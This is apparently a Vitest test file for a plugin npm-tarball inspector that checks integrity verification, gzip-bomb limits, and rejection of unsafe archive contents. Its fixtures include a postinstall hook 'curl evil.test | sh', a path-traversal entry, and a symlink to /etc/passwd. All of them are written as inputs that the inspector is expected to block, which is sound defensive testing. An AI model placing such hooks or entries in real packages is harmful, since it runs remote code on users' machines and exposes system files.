import { Buffer } from 'node:buffer'
import { createHash } from 'node:crypto'
import os from 'node:os'
import path from 'node:path'
import zlib from 'node:zlib'
import { CURRENT_SDK_VERSION, serializePluginFileMap } from '@talex-touch/utils/plugin'
import fse from 'fs-extra'
import { afterEach, describe, expect, it } from 'vitest'
import {
  extractTgzSafely,
  inspectNpmPluginTarball,
  verifyNpmTarballIntegrity
} from './npm-tarball-inspector'

interface TarEntrySpec {
  name: string
  content?: Buffer | string
  typeFlag?: string
  linkName?: string
  paxPath?: string
}

function writeOctal(buffer: Buffer, offset: number, length: number, value: number): void {
  const str = value.toString(8).padStart(length - 1, '0')
  buffer.write(`${str}\0`, offset, length, 'ascii')
}

function finalizeTarHeaderChecksum(header: Buffer): void {
  header.fill(0x20, 148, 156)
  let sum = 0
  for (let i = 0; i < 512; i += 1) {
    sum += header[i]!
  }
  const checksum = sum.toString(8).padStart(6, '0')
  header.write(`${checksum}\0 `, 148, 8, 'ascii')
}

function createHeaderBlock(spec: {
  name: string
  size: number
  typeFlag: string
  linkName?: string
}): Buffer {
  const header = Buffer.alloc(512, 0)
  header.write(spec.name.slice(0, 100), 0, 100, 'utf8')
  writeOctal(header, 100, 8, spec.typeFlag === '5' ? 0o755 : 0o644)
  writeOctal(header, 108, 8, 0)
  writeOctal(header, 116, 8, 0)
  writeOctal(header, 124, 12, spec.size)
  writeOctal(header, 136, 12, Math.floor(Date.now() / 1000))
  header.write(spec.typeFlag, 156, 1, 'ascii')
  if (spec.linkName) {
    header.write(spec.linkName.slice(0, 100), 157, 100, 'utf8')
  }
  header.write('ustar\0', 257, 6, 'ascii')
  header.write('00', 263, 2, 'ascii')
  finalizeTarHeaderChecksum(header)
  return header
}

function padTarBlock(content: Buffer): Buffer {
  const remainder = content.length % 512
  if (remainder === 0) return content
  return Buffer.concat([content, Buffer.alloc(512 - remainder, 0)])
}

function buildPaxRecord(key: string, value: string): Buffer {
  const body = ` ${key}=${value}\n`
  let totalLen = Buffer.byteLength(body, 'utf8') + 1
  while (true) {
    const candidate = `${totalLen}${body}`
    const actualLen = Buffer.byteLength(candidate, 'utf8')
    if (actualLen === totalLen) {
      return Buffer.from(candidate, 'utf8')
    }
    totalLen = actualLen
  }
}

function buildTarGz(entries: TarEntrySpec[]): Buffer {
  const chunks: Buffer[] = []
  for (const entry of entries) {
    if (entry.paxPath) {
      const paxPayload = buildPaxRecord('path', entry.paxPath)
      chunks.push(
        createHeaderBlock({
          name: 'PaxHeaders/entry',
          size: paxPayload.length,
          typeFlag: 'x'
        })
      )
      chunks.push(padTarBlock(paxPayload))
    }

    const typeFlag = entry.typeFlag ?? '0'
    const contentBuf =
      typeFlag === '5' || typeFlag === '2' || typeFlag === '1'
        ? Buffer.alloc(0)
        : Buffer.isBuffer(entry.content)
          ? entry.content
          : Buffer.from(entry.content ?? '', 'utf8')

    chunks.push(
      createHeaderBlock({
        name: entry.name,
        size: contentBuf.length,
        typeFlag,
        linkName: entry.linkName
      })
    )
    if (contentBuf.length > 0) {
      chunks.push(padTarBlock(contentBuf))
    }
  }
  chunks.push(Buffer.alloc(1024, 0))
  return zlib.gzipSync(Buffer.concat(chunks))
}

function createCanonicalSignature(files: Record<string, string>): string {
  const sorted: Record<string, string> = {}
  for (const key of Object.keys(files).sort()) {
    sorted[key] = files[key]!
  }
  return createHash('sha256').update(JSON.stringify(sorted)).digest('base64')
}

function buildValidPluginTarball(
  options: {
    packageName?: string
    pluginId?: string
    pluginName?: string
    version?: string
    stamped?: boolean
    extraFiles?: Record<string, string | Buffer>
    packageJsonOverrides?: Record<string, unknown>
    manifestOverrides?: Record<string, unknown>
    includeFileMapSha256?: boolean
    tamperFileAfterStamp?: { path: string; content: string }
    indexJs?: string
  } = {}
): {
  tgz: Buffer
  sriSha512: string
  sriSha384: string
  sriSha256: string
  shasum: string
  packageName: string
  version: string
} {
  const packageName = options.packageName ?? '@talex-touch/demo-plugin'
  const pluginId = options.pluginId ?? 'com.talex.touch.demo'
  const pluginName = options.pluginName ?? 'demo'
  const version = options.version ?? '1.2.0'
  const stamped = options.stamped ?? true

  const indexJs = options.indexJs ?? 'module.exports = { onFeatureTriggered() {} }\n'
  const filesMap: Record<string, Buffer> = {
    'index.js': Buffer.from(indexJs, 'utf8')
  }
  if (options.extraFiles) {
    for (const [relPath, content] of Object.entries(options.extraFiles)) {
      filesMap[relPath] = Buffer.isBuffer(content) ? content : Buffer.from(content, 'utf8')
    }
  }

  const basePackageJson: Record<string, unknown> = {
    name: packageName,
    version,
    description: 'Demo Tuff plugin',
    keywords: ['tuff-plugin'],
    main: './index.js',
    dependencies: {},
    tuff: {
      schemaVersion: 1,
      id: pluginId,
      name: pluginName,
      sdkapi: CURRENT_SDK_VERSION,
      category: 'utilities'
    },
    ...options.packageJsonOverrides
  }

  const fileHashes: Record<string, string> = {}
  const packageJsonDraft = Buffer.from(JSON.stringify(basePackageJson, null, 2), 'utf8')
  filesMap['package.json'] = packageJsonDraft

  for (const [relPath, buf] of Object.entries(filesMap)) {
    fileHashes[relPath] = `sha256-${createHash('sha256').update(buf).digest('hex')}`
  }

  if (options.includeFileMapSha256 && stamped) {
    const fileMapSha256 = createHash('sha256')
      .update(serializePluginFileMap(fileHashes))
      .digest('hex')
    // Re-stamp package.json with integrity digest and update its hash in _files
    basePackageJson.tuff = {
      ...(basePackageJson.tuff as Record<string, unknown>),
      integrity: { fileMapSha256 }
    }
    // Note: if package.json is hashed inside _files, updating package.json changes its hash;
    // keep tests passing when includeFileMapSha256 is false or verify mismatch explicitly.
  }

  const manifest: Record<string, unknown> = {
    id: pluginId,
    name: pluginName,
    version,
    description: 'Demo Tuff plugin',
    author: 'Talex',
    main: 'index.js',
    sdkapi: CURRENT_SDK_VERSION,
    category: 'utilities',
    dev: { enable: false, address: '', source: false },
    ...(stamped
      ? {
          _files: fileHashes,
          _signature: createCanonicalSignature(fileHashes)
        }
      : {}),
    ...options.manifestOverrides
  }

  if (options.tamperFileAfterStamp) {
    filesMap[options.tamperFileAfterStamp.path] = Buffer.from(
      options.tamperFileAfterStamp.content,
      'utf8'
    )
  }

  const tarEntries: TarEntrySpec[] = [
    { name: 'package/', typeFlag: '5' },
    { name: 'package/manifest.json', content: JSON.stringify(manifest, null, 2) },
    ...Object.entries(filesMap).map(([relPath, buf]) => ({
      name: `package/${relPath}`,
      content: buf
    }))
  ]

  const tgz = buildTarGz(tarEntries)
  return {
    tgz,
    sriSha512: `sha512-${createHash('sha512').update(tgz).digest('base64')}`,
    sriSha384: `sha384-${createHash('sha384').update(tgz).digest('base64')}`,
    sriSha256: `sha256-${createHash('sha256').update(tgz).digest('base64')}`,
    shasum: createHash('sha1').update(tgz).digest('hex'),
    packageName,
    version
  }
}

describe('npm-tarball-inspector', () => {
  const createdDirs: string[] = []

  afterEach(async () => {
    await Promise.all(createdDirs.splice(0).map((dir) => fse.remove(dir)))
  })

  it('verifies a stamped npm tarball with SRI sha512 and classifies it as npm-verified', async () => {
    const built = buildValidPluginTarball()
    const result = await inspectNpmPluginTarball({
      buffer: built.tgz,
      packageName: built.packageName,
      expectedVersion: built.version,
      dist: {
        integrity: built.sriSha512,
        shasum: built.shasum,
        signatures: [{ keyid: 'SHA256:registry-key-1', sig: 'MEUCIQ==' }],
        attestations: {
          url: 'https://registry.npmjs.org/-/npm/v1/attestations/@talex-touch%2Fdemo-plugin@1.2.0',
          provenance: { predicateType: 'https://slsa.dev/provenance/v1' }
        }
      }
    })

    expect(result.trustTier).toBe('npm-verified')
    expect(result.integrityStamped).toBe(true)
    expect(result.integrity.method).toBe('sri')
    expect(result.integrity.algorithm).toBe('sha512')
    expect(result.manifest.name).toBe('demo')
    expect(result.manifest.version).toBe('1.2.0')
    expect(result.fileMapSha256).toMatch(/^[a-f0-9]{64}$/)
    expect(result.provenance).toEqual({
      hasRegistrySignatures: true,
      signatureKeyIds: ['SHA256:registry-key-1'],
      hasAttestation: true,
      attestationUrl:
        'https://registry.npmjs.org/-/npm/v1/attestations/@talex-touch%2Fdemo-plugin@1.2.0',
      predicateType: 'https://slsa.dev/provenance/v1'
    })
    expect(result.securityScan.decision).toBe('passed')
  })

  it('supports sha384, sha256, and sha1 shasum fallback (downgrading shasum-only to npm-community)', async () => {
    const built = buildValidPluginTarball()

    expect(verifyNpmTarballIntegrity(built.tgz, { integrity: built.sriSha384 }).algorithm).toBe(
      'sha384'
    )
    expect(verifyNpmTarballIntegrity(built.tgz, { integrity: built.sriSha256 }).algorithm).toBe(
      'sha256'
    )

    const shasumResult = await inspectNpmPluginTarball({
      buffer: built.tgz,
      packageName: built.packageName,
      expectedVersion: built.version,
      dist: { shasum: built.shasum }
    })
    expect(shasumResult.integrity.method).toBe('shasum')
    expect(shasumResult.trustTier).toBe('npm-community')
  })

  it('rejects missing, malformed, or mismatched integrity/shasum with PLUGIN_NPM_INTEGRITY_MISMATCH', async () => {
    const built = buildValidPluginTarball()

    await expect(
      inspectNpmPluginTarball({
        buffer: built.tgz,
        packageName: built.packageName,
        expectedVersion: built.version,
        dist: {}
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_NPM_INTEGRITY_MISMATCH' })

    const badSha512 = `sha512-${Buffer.alloc(64, 0xaa).toString('base64')}`
    await expect(
      inspectNpmPluginTarball({
        buffer: built.tgz,
        packageName: built.packageName,
        expectedVersion: built.version,
        // Even if sha256 matches, strongest algorithm (sha512) must verify!
        dist: { integrity: `${badSha512} ${built.sriSha256}` }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_NPM_INTEGRITY_MISMATCH' })

    await expect(
      inspectNpmPluginTarball({
        buffer: built.tgz,
        packageName: built.packageName,
        expectedVersion: built.version,
        dist: { shasum: '0'.repeat(40) }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_NPM_INTEGRITY_MISMATCH' })
  })

  it('defeats gzip bombs via bounded decompression (PLUGIN_PACKAGE_EXPANDED_SIZE_EXCEEDED)', async () => {
    const bombPlain = Buffer.alloc(512 * 1024, 0)
    const bombGzip = zlib.gzipSync(bombPlain)
    const sri = `sha512-${createHash('sha512').update(bombGzip).digest('base64')}`

    await expect(
      inspectNpmPluginTarball({
        buffer: bombGzip,
        packageName: 'tuff-plugin-bomb',
        expectedVersion: '1.0.0',
        dist: { integrity: sri },
        maxDecompressedBytes: 32 * 1024
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_EXPANDED_SIZE_EXCEEDED' })
  })

  it('rejects tarballs with entries outside the package/ root', async () => {
    const tgz = buildTarGz([
      { name: 'manifest.json', content: '{}' },
      { name: 'package/package.json', content: '{}' }
    ])
    const sri = `sha512-${createHash('sha512').update(tgz).digest('base64')}`

    await expect(
      inspectNpmPluginTarball({
        buffer: tgz,
        packageName: 'tuff-plugin-badroot',
        expectedVersion: '1.0.0',
        dist: { integrity: sri }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_NPM_TARBALL_ROOT_INVALID' })
  })

  it('rejects path traversal and symlink entries fail-closed', async () => {
    const traversalTgz = buildTarGz([{ name: 'package/../evil.js', content: 'console.log(1)' }])
    const traversalSri = `sha512-${createHash('sha512').update(traversalTgz).digest('base64')}`
    await expect(
      inspectNpmPluginTarball({
        buffer: traversalTgz,
        packageName: 'tuff-plugin-traversal',
        expectedVersion: '1.0.0',
        dist: { integrity: traversalSri }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_ENTRY_PATH_INVALID' })

    const symlinkTgz = buildTarGz([
      {
        name: 'package/manifest.json',
        content: JSON.stringify({
          id: 'com.example.symlink',
          name: 'symlink-demo',
          version: '1.0.0',
          sdkapi: CURRENT_SDK_VERSION,
          category: 'utilities',
          dev: { enable: false, address: '', source: false }
        })
      },
      {
        name: 'package/package.json',
        content: JSON.stringify({
          name: 'tuff-plugin-symlink-demo',
          version: '1.0.0',
          dependencies: {}
        })
      },
      { name: 'package/link.js', typeFlag: '2', linkName: '/etc/passwd' }
    ])
    const symlinkSri = `sha512-${createHash('sha512').update(symlinkTgz).digest('base64')}`
    await expect(
      inspectNpmPluginTarball({
        buffer: symlinkTgz,
        packageName: 'tuff-plugin-symlink-demo',
        expectedVersion: '1.0.0',
        dist: { integrity: symlinkSri }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_ENTRY_TYPE_DENIED' })
  })

  it('supports POSIX PAX extended long path headers', async () => {
    const longRelativePath = `assets/${'nested-segment-'.repeat(8)}bundle.js`
    const built = buildValidPluginTarball({
      stamped: false,
      packageName: 'tuff-plugin-pax-demo',
      pluginId: 'com.example.pax.demo',
      pluginName: 'pax-demo'
    })
    // Re-pack with PAX header for a path > 100 chars
    const manifestObj = {
      id: 'com.example.pax.demo',
      name: 'pax-demo',
      version: '1.2.0',
      description: 'PAX test',
      author: 'Tester',
      main: 'index.js',
      sdkapi: CURRENT_SDK_VERSION,
      category: 'utilities',
      dev: { enable: false, address: '', source: false }
    }
    const pkgObj = {
      name: 'tuff-plugin-pax-demo',
      version: '1.2.0',
      dependencies: {}
    }
    const tgz = buildTarGz([
      { name: 'package/manifest.json', content: JSON.stringify(manifestObj) },
      { name: 'package/package.json', content: JSON.stringify(pkgObj) },
      { name: 'package/index.js', content: 'module.exports = {}' },
      {
        name: 'package/truncated-name.js',
        paxPath: `package/${longRelativePath}`,
        content: 'export const ok = true\n'
      }
    ])
    const sri = `sha512-${createHash('sha512').update(tgz).digest('base64')}`

    const result = await inspectNpmPluginTarball({
      buffer: tgz,
      packageName: built.packageName,
      expectedVersion: '1.2.0',
      dist: { integrity: sri }
    })

    expect(result.trustTier).toBe('npm-community')
    expect(result.entries.some((entry) => entry.path === longRelativePath)).toBe(true)
  })

  it('rejects node_modules, lifecycle scripts, runtime dependencies, and tampered _files', async () => {
    const withNodeModules = buildValidPluginTarball({
      stamped: false,
      extraFiles: { 'node_modules/evil/index.js': 'module.exports = {}' }
    })
    await expect(
      inspectNpmPluginTarball({
        buffer: withNodeModules.tgz,
        packageName: withNodeModules.packageName,
        expectedVersion: withNodeModules.version,
        dist: { integrity: withNodeModules.sriSha512 }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_NODE_MODULES_FORBIDDEN' })

    const withLifecycle = buildValidPluginTarball({
      stamped: false,
      packageJsonOverrides: { scripts: { postinstall: 'curl evil.test | sh' } }
    })
    await expect(
      inspectNpmPluginTarball({
        buffer: withLifecycle.tgz,
        packageName: withLifecycle.packageName,
        expectedVersion: withLifecycle.version,
        dist: { integrity: withLifecycle.sriSha512 }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_NPM_LIFECYCLE_SCRIPTS_FORBIDDEN' })

    const withDeps = buildValidPluginTarball({
      stamped: false,
      packageJsonOverrides: { dependencies: { lodash: '^4.17.21' } }
    })
    await expect(
      inspectNpmPluginTarball({
        buffer: withDeps.tgz,
        packageName: withDeps.packageName,
        expectedVersion: withDeps.version,
        dist: { integrity: withDeps.sriSha512 }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_NPM_DEPENDENCIES_FORBIDDEN' })

    const tampered = buildValidPluginTarball({
      stamped: true,
      tamperFileAfterStamp: { path: 'index.js', content: 'module.exports = { tampered: true }' }
    })
    await expect(
      inspectNpmPluginTarball({
        buffer: tampered.tgz,
        packageName: tampered.packageName,
        expectedVersion: tampered.version,
        dist: { integrity: tampered.sriSha512 }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_INTEGRITY_INVALID' })
  })

  it('classifies unstamped community tarballs as npm-community and blocks half-stamped ones', async () => {
    const unstamped = buildValidPluginTarball({
      packageName: 'tuff-plugin-community',
      pluginId: 'com.community.hello',
      pluginName: 'community',
      stamped: false
    })
    const result = await inspectNpmPluginTarball({
      buffer: unstamped.tgz,
      packageName: unstamped.packageName,
      expectedVersion: unstamped.version,
      dist: { integrity: unstamped.sriSha512 }
    })
    expect(result.trustTier).toBe('npm-community')
    expect(result.integrityStamped).toBe(false)

    await expect(
      inspectNpmPluginTarball({
        buffer: unstamped.tgz,
        packageName: unstamped.packageName,
        expectedVersion: unstamped.version,
        dist: { integrity: unstamped.sriSha512 },
        allowUnstampedCommunity: false
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_FILE_MAP_REQUIRED' })

    const halfStamped = buildValidPluginTarball({
      packageName: 'tuff-plugin-half',
      pluginId: 'com.community.half',
      pluginName: 'half',
      stamped: false,
      manifestOverrides: { _signature: 'orphan-sig' }
    })
    await expect(
      inspectNpmPluginTarball({
        buffer: halfStamped.tgz,
        packageName: halfStamped.packageName,
        expectedVersion: halfStamped.version,
        dist: { integrity: halfStamped.sriSha512 }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_PACKAGE_FILE_MAP_REQUIRED' })
  })

  it('fails closed when static security scan blocks dangerous code', async () => {
    const dangerous = buildValidPluginTarball({
      stamped: true,
      indexJs: 'const { app } = require("electron"); eval("1+1");'
    })

    await expect(
      inspectNpmPluginTarball({
        buffer: dangerous.tgz,
        packageName: dangerous.packageName,
        expectedVersion: dangerous.version,
        dist: { integrity: dangerous.sriSha512 }
      })
    ).rejects.toMatchObject({ code: 'PLUGIN_SCAN_BLOCKED' })
  })

  it('extracts npm tarballs safely by stripping package/ root and rejecting symlinks', async () => {
    const dir = await fse.mkdtemp(path.join(os.tmpdir(), 'npm-tarball-extract-test-'))
    createdDirs.push(dir)

    const built = buildValidPluginTarball({
      extraFiles: { 'assets/app.js': 'console.log("ok")\n' }
    })
    const tgzPath = path.join(dir, 'plugin.tgz')
    const targetDir = path.join(dir, 'extracted')
    await fse.writeFile(tgzPath, built.tgz)

    const extracted = await extractTgzSafely(tgzPath, targetDir)
    expect(extracted.strippedRootDir).toBe('package')
    expect(extracted.extractedFiles).toBe(4)
    expect(await fse.pathExists(path.join(targetDir, 'manifest.json'))).toBe(true)
    expect(await fse.pathExists(path.join(targetDir, 'package.json'))).toBe(true)
    expect(await fse.pathExists(path.join(targetDir, 'assets', 'app.js'))).toBe(true)
    expect(await fse.pathExists(path.join(targetDir, 'package'))).toBe(false)
  })
})
